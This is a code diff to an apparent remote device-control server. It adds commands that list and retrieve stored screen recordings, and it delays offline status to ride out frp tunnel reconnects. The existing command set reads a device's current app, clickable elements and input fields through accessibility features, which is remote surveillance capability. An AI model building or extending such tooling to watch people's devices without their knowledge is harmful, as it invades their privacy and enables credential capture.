@@ -202,6 +202,9 @@ const COMMANDS = {
     get_current_app:           { category: 'screen_reader',label: 'Current App',           icon: '📱' },
     get_clickable_elements:    { category: 'screen_reader',label: 'Clickable Elements',    icon: '👆' },
     get_input_fields:          { category: 'screen_reader',label: 'Input Fields',          icon: '✏️'  },
+    // Screen Reader Recordings (server-side, handled by backend filesystem)
+    list_screen_recordings:    { category: 'screen_reader',label: 'List Screen Recordings',icon: '🎞' },
+    get_screen_recording:      { category: 'screen_reader',label: 'Get Screen Recording',  icon: '📥' },
     // Accessibility check
     get_accessibility_status:  { category: 'system',       label: 'Accessibility Status',  icon: '♿' },
     // Streaming
@@ -751,15 +754,27 @@ const tcpServer = net.createServer({ allowHalfOpen: false }, (conn) => {
                     log('TCP', `Stale primary closed for ${conn.deviceId} — new primary active, skipping disconnect broadcast`);
                     return;
                 }
-                deviceToTcp.delete(conn.deviceId);
-                deviceStreamingState.delete(conn.deviceId);
-                R.markDeviceOffline(conn.deviceId).catch(() => {});
-                try {
-                    await Device.findOneAndUpdate({ deviceId: conn.deviceId },
-                        { isOnline: false, lastSeen: new Date() });
-                } catch (e) {}
-                broadcastDash('device:disconnected', { deviceId: conn.deviceId, timestamp: new Date() });
-                broadcastDeviceList();
+                // Grace period: wait 3 s before marking offline, so rapid reconnects (frp tunnel
+                // rotation, mobile network handoffs) don't produce false offline flashes in the UI.
+                const disconnectedDeviceId = conn.deviceId;
+                const disconnectedConnId   = id;
+                setTimeout(async () => {
+                    // Re-check: if a new primary has registered in the meantime, skip broadcast
+                    if (deviceToTcp.get(disconnectedDeviceId) !== disconnectedConnId &&
+                        deviceToTcp.has(disconnectedDeviceId)) {
+                        log('TCP', `Stale primary grace: ${disconnectedDeviceId} reconnected — skipping offline broadcast`);
+                        return;
+                    }
+                    deviceToTcp.delete(disconnectedDeviceId);
+                    deviceStreamingState.delete(disconnectedDeviceId);
+                    R.markDeviceOffline(disconnectedDeviceId).catch(() => {});
+                    try {
+                        await Device.findOneAndUpdate({ deviceId: disconnectedDeviceId },
+                            { isOnline: false, lastSeen: new Date() });
+                    } catch (e) {}
+                    broadcastDash('device:disconnected', { deviceId: disconnectedDeviceId, timestamp: new Date() });
+                    broadcastDeviceList();
+                }, 3000);
             }
         }
     });
@@ -998,6 +1013,68 @@ app.post('/api/commands', async (req, res) => {
     if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
     if (!COMMANDS[command]) return res.status(400).json({ error: `Unknown command: ${command}` });
 
+    // ── Server-side commands: list_screen_recordings — served from backend filesystem (no device needed) ──
+    if (command === 'list_screen_recordings') {
+        const commandId = crypto.randomBytes(12).toString('hex');
+        const safeId = deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
+        const deviceDir = path.join(RECORDINGS_DIR, safeId);
+        let recordings = [];
+        try {
+            if (fs.existsSync(deviceDir)) {
+                const files = fs.readdirSync(deviceDir).filter(f => f.endsWith('.json'));
+                recordings = files.map(f => {
+                    const fp = path.join(deviceDir, f);
+                    const stat = fs.statSync(fp);
+                    let extra = {};
+                    try {
+                        const raw = JSON.parse(fs.readFileSync(fp, 'utf8'));
+                        extra = { label: raw.label, frameCount: raw.frameCount, startTime: raw.startTime, endTime: raw.endTime };
+                    } catch (_) {}
+                    return { filename: f, size: stat.size, modified: stat.mtime, ...extra };
+                }).sort((a, b) => new Date(b.modified) - new Date(a.modified));
+            }
+        } catch (e) { log('CMD', `list_screen_recordings error: ${e.message}`, 'warn'); }
+        broadcastDash('command:result', {
+            commandId, command: 'list_screen_recordings', deviceId, success: true,
+            response: JSON.stringify({ recordings }), timestamp: new Date()
+        });
+        res.json({ success: true, commandId, command, deviceId, status: 'executing', timestamp: new Date() });
+        return;
+    }
+
+    // ── Special: get_screen_recording — served from backend filesystem ──
+    if (command === 'get_screen_recording') {
+        const commandId = crypto.randomBytes(12).toString('hex');
+        const safeId = deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
+        const filename = (params || {}).filename;
+        if (!filename) {
+            return res.status(400).json({ error: 'filename param required' });
+        }
+        const safeName = path.basename(filename);
+        const fp = path.join(RECORDINGS_DIR, safeId, safeName);
+        let data = null;
+        try {
+            if (fs.existsSync(fp)) {
+                data = JSON.parse(fs.readFileSync(fp, 'utf8'));
+            }
+        } catch (e) { log('CMD', `get_screen_recording error: ${e.message}`, 'warn'); }
+        if (data) {
+            broadcastDash('command:result', {
+                commandId, command: 'get_screen_recording', deviceId, success: true,
+                response: JSON.stringify({ ...data, filename: safeName }), timestamp: new Date()
+            });
+            res.json({ success: true, commandId, command, deviceId, status: 'executing', timestamp: new Date() });
+        } else {
+            broadcastDash('command:result', {
+                commandId, command: 'get_screen_recording', deviceId, success: false,
+                error: 'Recording not found', timestamp: new Date()
+            });
+            res.json({ success: false, commandId, command, deviceId, error: 'Recording not found', timestamp: new Date() });
+        }
+        return;
+    }
+
+    // ── For all remaining commands: require device to be online ──
     const tcpConnId = deviceToTcp.get(deviceId);
     const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
     if (!tcpConn || !tcpConn.writable) return res.status(503).json({ error: 'Device offline', deviceId });
